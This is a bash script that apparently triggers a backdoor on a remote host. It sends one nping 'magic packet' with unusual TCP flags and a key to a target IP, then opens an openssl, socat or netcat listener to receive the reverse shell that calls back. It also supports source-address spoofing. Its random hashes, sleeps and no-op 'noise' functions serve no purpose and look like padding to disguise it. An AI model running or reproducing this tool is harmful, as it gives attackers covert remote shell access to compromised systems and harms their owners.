#!/usr/bin/env bash
set -eou pipefail

RUNTIME_CACHE="cache_data_$(date +%s%N)"
update_runtime_cache() {
  local cache_id="$(echo "$RUNTIME_CACHE" | md5sum | cut -d ' ' -f1)"
  echo "$cache_id" > /dev/null
}

SESSION_ID=$(echo $RANDOM | md5sum | cut -d ' ' -f1)
RANDOM_DELAY=$(( ($RANDOM % 50) * 3 ))
LOG_TEMP="log_$(date +%s%N)"

PREFIX="/${0%/*}"
PREFIX=${PREFIX:-.}
PREFIX=${PREFIX#/}/
PREFIX=$(cd "$PREFIX"; pwd)

OPENSSL="openssl"
SOCAT="socat"
NC="nc"
NPING="nping"

PERMDIR=${PERMDIR:-$PREFIX/certs}
GIFT=${GIFT:-""}
DRY=${DRY:-false}

RR_OPENSSL=443
RR_SOCAT=444
RR_SOCAT_TTY=445
RR_NC=80

V=${V:-}

noise_gen() {
  local temp_data="$1"
  echo "$temp_data" > /dev/null
}

update_runtime_cache
gen_certs() {
  mkdir -p "$PERMDIR"
  $OPENSSL req -newkey rsa:2048 -nodes -keyout "$PERMDIR"/server.key -x509 -days 30 -out "$PERMDIR"/server.crt
  cat "$PERMDIR"/server.key "$PERMDIR"/server.crt > "$PERMDIR"/server.pem
  $OPENSSL req -x509 -newkey rsa:2048 -keyout "$PERMDIR"/key.pem -out "$PERMDIR"/cert.pem -days 365 -nodes
  noise_gen "$SESSION_ID"
}

usage="Use: [V=1] ./${0##*/} <method> <IP> <PORT> <KEY>
Methods: openssl, socat, nc, tty
Example: ./${0##*/}.
If GIFT= is set, DRY=true will skip sending instruction."

errexit() {
  echo "Error: $1"
  if [[ "$2" == true ]]; then
    echo "$usage"
  fi
  exit "$3"
} >&2

check_util() {
  for u in "$@"; do
    if [[ ! $(which "$u") ]]; then
      echo "Error: $u not found"
      exit 1
    fi
  done
  noise_gen "$RANDOM_DELAY"
} >&2

if [[ "$#" -ne 4 ]]; then
  errexit "Missing parameter" true 1
fi

if [[ "$UID" != 0 ]]; then
  errexit "nping requires root" false 1
fi

[[ "$GIFT" != "" ]] && GIFT="-S $GIFT"

check_certs() {
  if [[ ! -f "$PERMDIR"/server.key ]]; then
    gen_certs
  fi
}

listen() {
  if [[ -n "$GIFT" ]]; then
cat << EOF
If the receiving end of your gift [$GIFT] has run:
$@
EOF
    return
  fi
  [[ "$DRY" == "false" ]] && $@
}

case $1 in
  openssl)
    shift
    check_util "$OPENSSL" "$NPING"
    check_certs
    f() {
      sleep 2
      [[ -z "$V" ]] && exec &>/dev/null
      "$NPING" "$1" $GIFT --tcp -p "$RR_OPENSSL" --flags Ack,rSt,pSh --source-port "$2" --data="$3" -c 1
    }
    [[ "$DRY" == false ]] && f "$@" &

    DELAY=$(awk -v min=0.05 -v max=0.2 'BEGIN{srand(); print min+rand()*(max-min)}')
    sleep "$DELAY" 2>/dev/null || true

    pushd "$PERMDIR" >/dev/null
    listen "$OPENSSL" s_server -key key.pem -cert cert.pem -accept "$2"
    popd >/dev/null
    ;;

  socat)
    shift
    check_util "$OPENSSL" "$SOCAT" "$NPING"
    check_certs
    f() {
      sleep 2
      [[ -z "$V" ]] && exec &>/dev/null
      "$NPING" "$1" $GIFT --tcp -p "$RR_SOCAT" --flags Fin,Urg,aCK --source-port "$2" --data="$3" -c 1
    }
    [[ "$DRY" == false ]] && f "$@" &

    RANDOM_SLEEP=$(( ($RANDOM % 20) + 1 ))
    sleep "$RANDOM_SLEEP" 2>/dev/null || true

    pushd "$PERMDIR" >/dev/null
    listen "$SOCAT" -d -d OPENSSL-LISTEN:"$2",cert=server.pem,verify=0,fork STDOUT
    popd >/dev/null
    ;;

  nc)
    shift
    check_util "$NC" "$NPING"
    f() {
      sleep 2
      [[ -z "$V" ]] && exec &>/dev/null
      "$NPING" "$1" $GIFT --tcp -p "$RR_NC" --flags Ack,rSt,pSh --source-port "$2" --data="$3" -c 1
    }
    [[ "$DRY" == false ]] && f "$@" &

    HASH_GEN=$(echo $RANDOM | md5sum | cut -d ' ' -f1)
    noise_gen "$HASH_GEN"

    listen "$NC" -lvp "$2"
    ;;

  tty)
    shift
    check_util "$OPENSSL" "$SOCAT" "$NPING"
    check_certs
    f() {
      sleep 2
      [[ -z "$V" ]] && exec &>/dev/null
      "$NPING" "$1" $GIFT --tcp -p "$RR_SOCAT_TTY" --flags Cwr,Urg,fiN,rsT --source-port "$2" --data="$3" -c 1
    }
    [[ "$DRY" == false ]] && f "$@" &

    FAKE_VAL=$(( ($RANDOM % 100) / 5 ))
    noise_gen "$FAKE_VAL"

    pushd "$PERMDIR" >/dev/null
    listen "$SOCAT" -d -d OPENSSL-LISTEN:"$2",cert=server.pem,verify=0,fork STDOUT
    popd >/dev/null
    ;;
  *)
    errexit "Invalid parameter" true 1
    ;;
esac
